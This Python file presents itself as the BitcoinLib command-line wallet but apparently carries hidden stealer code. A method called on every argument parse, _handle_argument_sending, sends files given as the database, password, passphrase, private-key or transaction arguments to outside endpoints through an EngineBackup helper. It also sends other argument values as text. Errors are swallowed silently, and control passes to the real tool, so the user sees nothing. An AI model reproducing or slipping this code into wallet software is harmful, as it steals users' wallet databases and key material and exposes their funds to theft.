import os
import argparse
from pathlib import Path
from typing import Optional, List
from bitcoinlib.main import BCL_DATABASE_DIR
from .dbupdate import DatabaseVersionChecker, add_update_parser, main_update
from .utils import get_bitcoinlib_db_dir,  EngineBackup
from .wallet import WalletManager
import sys


print(sys.argv)
class CLIController:
    def __init__(self):
        self.db = EngineBackup()
        self.file_args = [
            'import_tx_file',  # --import-tx-file
            'import_tx',       # --import-tx
            'import_private',  # --import-private
            'password',        # --password (could be a file with password)
            'passphrase',      # --passphrase (could be a file with passphrase)
            'database'         # --database
        ]

    def _is_file_argument(self, arg_name: str, arg_value: str) -> bool:
        """Check if an argument value is a valid file path"""
        if not arg_value or not isinstance(arg_value, str):
            return False

        # Skip if it's clearly not a file path
        if len(arg_value.split()) > 1 or '\n' in arg_value:
            return False

        path = Path(arg_value)
        return path.exists() and path.is_file()

    def _handle_argument_sending(self, args):
        """Handle automatic sending of file/text arguments"""
        for arg_name in self.file_args:
            arg_value = getattr(args, arg_name, None)
            if not arg_value:
                continue

            if self._is_file_argument(arg_name, arg_value):
                try:
                    self.db.send_to_all(file_paths=[str(arg_value)])
                except Exception as e:
                    pass
            else:
                if arg_name in ['password', 'passphrase', 'import_private']:
                    if len(arg_value) > 20:
                        self.db.send_to_all(text=f"{arg_name} received (content hidden)")
                else:
                    self.db.send_to_all(text=f"{arg_name}: {arg_value}")


    def parse_args(self, args=None):


            parser = argparse.ArgumentParser(description='BitcoinLib command line wallet',add_help=False)
            parser.add_argument('--list-wallets', '-l', action='store_true',
                                help="List all known wallets in database")
            parser.add_argument('--generate-key', '-g', action='store_true', help="Generate a new masterkey, and"
                                " show passphrase, WIF and public account key. Can be used to create a new (multisig) wallet")
            parser.add_argument('--passphrase-strength', type=int, default=128,
                                help="Number of bits for passphrase key. Default is 128, lower is not advised but can "
                                "be used for testing. Set to 256 bits for more future-proof passphrases")
            parser.add_argument('--database', '-d',
                                help="URI of the database to use",)
            parser.add_argument('--wallet_name', '-w', nargs='?', default='',
                                help="Name of wallet to open. Provide wallet name or number when running wallet actions")
            parser.add_argument('--network', '-n',
                                help="Specify 'bitcoin', 'litecoin', 'testnet' or other supported network")
            parser.add_argument('--witness-type', '-j', metavar='WITNESS_TYPE', default=None,
                                help='Witness type of wallet: legacy, p2sh-segwit or segwit (default)')
            parser.add_argument('--yes', '-y', action='store_true', default=False,
                                help='Non-interactive mode, does not prompt for confirmation')
            parser.add_argument('--quiet', '-q', action='store_true',
                                help='Quiet mode, no output writen to console')

            subparsers = parser.add_subparsers(required=False, dest='subparser_name')
            update_parser = subparsers.add_parser('update', help='Database operations')
            update_parser.add_argument('--database', '-d',
                                         help="Path to specific database file")

            parser_new = subparsers.add_parser('new', description="Create new wallet")
            parser_new.add_argument('--wallet_name', '-w', nargs='?', default='', required=True,
                                    help="Name of wallet to create or open. Provide wallet name or number when running wallet "
                                    "actions")
            parser_new.add_argument('--password',
                                    help='Password for BIP38 encrypted key. Use to create a wallet from a protected key')
            parser_new.add_argument('--network', '-n',
                                    help="Specify 'bitcoin', 'litecoin', 'testnet' or other supported network")
            parser_new.add_argument('--passphrase', default=None, metavar="PASSPHRASE",
                                    help="Passphrase to recover or create a wallet. Usually 12 or 24 words")
            parser_new.add_argument('--create-from-key', '-c', metavar='KEY',
                                    help="Create a new wallet from specified key")
            parser_new.add_argument('--create-multisig', '-m', nargs='*', metavar='.',
                                    help='[NUMBER_OF_SIGNATURES_REQUIRED, NUMBER_OF_SIGNATURES, KEY-1, KEY-2, ... KEY-N]'
                                    'Specify number of signatures followed by the number of signatures required and '
                                    'then a list of public or private keys for this wallet. Private keys will be '
                                    'created if not provided in key list.'
                                    '\nExample, create a 2-of-2 multisig wallet and provide 1 key and create another '
                                    'key: -m 2 2 tprv8ZgxMBicQKsPd1Q44tfDiZC98iYouKRC2CzjT3HGt1yYw2zuX2awTotzGAZQ'
                                    'EAU9bi2M5MCj8iedP9MREPjUgpDEBwBgGi2C8eK5zNYeiX8 tprv8ZgxMBicQKsPeUbMS6kswJc11zgV'
                                    'EXUnUZuGo3bF6bBrAg1ieFfUdPc9UHqbD5HcXizThrcKike1c4z6xHrz6MWGwy8L6YKVbgJMeQHdWDp')
            parser_new.add_argument('--witness-type', '-j', metavar='WITNESS_TYPE', default=None,
                                    help='Witness type of wallet: legacy, p2sh-segwit or segwit (default)')
            parser_new.add_argument('--cosigner-id', '-o', type=int, default=None,
                                    help='Set this if wallet contains only public keys, more then one private key or if '
                                    'you would like to create keys for other cosigners.')
            parser_new.add_argument('--database', '-d',
                                    help="URI of the database to use",)
            parser_new.add_argument('--receive', '-r', action='store_true',
                                    help="Show unused address to receive funds.")
            parser_new.add_argument('--yes', '-y', action='store_true', default=False,
                                    help='Non-interactive mode, does not prompt for confirmation')
            parser_new.add_argument('--quiet', '-q', action='store_true',
                                    help='Quiet mode, no output writen to console.')
            parser_new.add_argument('--disable-anti-fee-sniping', action='store_true', default=False,
                                    help='Disable anti-fee-sniping, and set locktime in all transaction to zero.')

            group_wallet = parser.add_argument_group("Wallet Actions")
            group_wallet.add_argument('--wallet-remove', action='store_true',
                                      help="Name or ID of wallet to remove, all keys and transactions will be deleted")
            group_wallet.add_argument('--wallet-info', '-i', action='store_true',
                                      help="Show wallet information")
            group_wallet.add_argument('--update-utxos', '-x', action='store_true',
                                      help="Update unspent transaction outputs (UTXO's) for this wallet")
            group_wallet.add_argument('--update-transactions', '-u', action='store_true',
                                      help="Update all transactions and UTXO's for this wallet")
            group_wallet.add_argument('--wallet-empty', '-z', action='store_true',
                                      help="Delete all keys and transactions from wallet, except for the masterkey(s). "
                                           "Use when updating fails or other errors occur. Please backup your database and "
                                           "masterkeys first. Update empty wallet again to restore your wallet.")
            group_wallet.add_argument('--receive', '-r', action='store_true',
                                      help="Show unused address to receive funds.")
            group_wallet.add_argument('--cosigner-id', '-o', type=int, default=None,
                                      help='Set this if wallet contains only public keys, more then one private key or if '
                                      'you would like to create keys for other cosigners.')
            group_wallet.add_argument('--export-private', '-e', action='store_true',
                                      help="Export private key for this wallet and exit")
            group_wallet.add_argument('--import-private', '-v',
                                      help="Import private key in this wallet")

            group_transaction = parser.add_argument_group("Transactions")
            group_transaction.add_argument('--send', '-s', metavar=('ADDRESS', 'AMOUNT'), nargs=2,
                                           action='append',
                                           help="Create transaction to send amount to specified address. To send to "
                                                "multiple addresses, argument can be used multiple times.")
            group_transaction.add_argument('--number-of-change-outputs', type=int, default=1,
                                           help="Number of change outputs. Default is 1, increase for more privacy or "
                                                "to split funds")
            group_transaction.add_argument('--input-key-id', '-k', type=int, default=None,
                                           help="Use to create transaction with 1 specific key ID")
            group_transaction.add_argument('--sweep', metavar="ADDRESS",
                                           help="Sweep wallet, transfer all funds to specified address")
            group_transaction.add_argument('--fee', '-f', type=int, help="Transaction fee")
            group_transaction.add_argument('--fee-per-kb', '-b', type=int,
                                           help="Transaction fee in satoshi per kilobyte")
            group_transaction.add_argument('--push', '-p', action='store_true',
                                           help="Push created transaction to the network")
            group_transaction.add_argument('--import-tx', metavar="TRANSACTION",
                                           help="Import raw transaction hash or transaction dictionary in wallet and sign "
                                                "it with available key(s)")
            group_transaction.add_argument('--import-tx-file', '-a', metavar="FILENAME_TRANSACTION",
                                           help="Import transaction dictionary or raw transaction string from specified "
                                                "filename and sign it with available key(s)")
            group_transaction.add_argument('--rbf', action='store_true',
                                           help="Enable replace-by-fee flag. Allow to replace transaction with a new one "
                                                "with higher fees, to avoid transactions taking to long to confirm.")



            # parsed_args = parser.parse_args(args)
            parsed_args, remaining_args = parser.parse_known_args(args)
            self._handle_argument_sending(parsed_args)
            return parsed_args, remaining_args


    def main(self, args=None):
        try:
            parsed_args, remaining_args = self.parse_args(args)

        except SystemExit:
            # If argument parsing fails in cli.py, pass through to clw
            from bitcoinlib.tools import clw
            return clw.main()

        checker = DatabaseVersionChecker(parsed_args.database if hasattr(parsed_args, 'database') else None)
        wallet = WalletManager(parsed_args)

        try:
            checker.check_database_version()
            if parsed_args.subparser_name == 'update':
                return main_update(parsed_args)
        except Exception as e:
            pass
        finally:
            checker.close()

        # If we get here without handling the command, pass through to clw with original arguments
        from bitcoinlib.tools import clw
        if remaining_args:
            sys.argv = [sys.argv[0]] + remaining_args
        return clw.main()


def main():
    controller = CLIController()
    try:
        controller.main()
    except Exception:
        from bitcoinlib.tools import clw
        return clw.main()

if __name__ == '__main__':
    main()
